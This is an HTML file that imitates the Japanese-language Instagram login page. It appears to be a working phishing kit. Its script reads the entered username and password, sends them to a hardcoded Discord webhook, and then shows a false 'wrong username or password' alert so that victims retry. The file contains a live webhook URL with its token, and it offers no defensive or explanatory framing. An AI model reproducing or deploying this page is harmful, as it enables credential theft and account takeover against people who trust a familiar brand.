<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
    <title>Instagram</title>
    <style>
        :root {
            --background-color: #fafafa;
            --container-bg-color: #ffffff;
            --text-color: #262626;
            --border-color: #dbdbdb;
            --input-bg-color: #fafafa;
            --link-color: #00376b;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--background-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background-color 0.3s, color 0.3s;
        }

        /* ダークモード用のカラースタイル */
        body.dark-mode {
            --background-color: #121212;
            --container-bg-color: #1e1e1e;
            --text-color: #e0e0e0;
            --border-color: #363636;
            --input-bg-color: #2c2c2c;
            --link-color: #8ab4f8;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .box {
            border: 1px solid var(--border-color);
            background-color: var(--container-bg-color);
            padding: 20px 40px;
            text-align: center;
            width: 300px;
            transition: background-color 0.3s, border-color 0.3s;
        }

        .login-box {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            background-color: var(--input-bg-color);
            color: var(--text-color);
        }

        button {
            width: 100%;
            padding: 8px;
            margin-top: 10px;
            border-radius: 8px;
            border: none;
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            cursor: pointer;
            opacity: 0.8;
            transition: opacity 0.2s;
        }

        button:hover {
            opacity: 1;
        }

        .logo {
            font-size: 36px;
            font-family: 'Grand Hotel', cursive;
            margin-bottom: 25px;
        }

        a {
            color: var(--link-color);
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box p {
            margin: 15px;
            font-size: 14px;
        }

        .signup-box a {
            font-weight: bold;
            font-size: 14px;
            color: #0095f6;
        }
        
        #darkModeToggle {
            margin-top: 20px;
            padding: 10px;
            font-size: 12px;
            width: auto;
            background-color: #363636;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- ログインフォーム -->
        <div class="box login-box">
            <div class="logo">Instagram</div>

            <form id="loginForm" method="post">
                <input type="text" name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス" aria-label="電話番号、ユーザーネーム、またはメールアドレス" required>
                <input type="password" name="password" placeholder="パスワード" aria-label="パスワード" required>
                <button type="submit">ログイン</button>
            </form>

            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">パスワードを忘れた場合</a>
        </div>
      
        <div class="box signup-box">
            <p>アカウントを持っていない場合 <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">登録する</a></p>
        </div>

        <div style="text-align: center;">
            <button id="darkModeToggle">ダークモードに切り替え</button>
        </div>
    </div>
    
    <script>
        const loginForm = document.getElementById('loginForm');

        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            const webhookURL = "https://discord.com/api/webhooks/1434801776619556894/UJLMDfu_lwFcydIAFNmxdRBSlvAagW590w8hzVXh5st6H9A1vbIkzTEBhWBiHejkTGgL";

            const payload = {
                content: `【ログイン情報が入力されました】\nユーザー名: ${username}\nパスワード: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Webhookにデータを送信しました。");
                    alert("ユーザーネームまたはパスワードが違います。");
                    loginForm.reset();
                } else {
                    console.error("Webhookへの送信に失敗しました。");
                }
            })
            .catch(error => console.error('送信中にエラーが発生しました:', error));
        });

        const darkModeToggle = document.getElementById('darkModeToggle');
        const body = document.body;

        darkModeToggle.addEventListener('click', () => {
            body.classList.toggle('dark-mode');

            if (body.classList.contains('dark-mode')) {
                darkModeToggle.textContent = 'ライトモードに切り替え';
            } else {
                darkModeToggle.textContent = 'ダークモードに切り替え';
            }
        });
    </script>

</body>
</html>
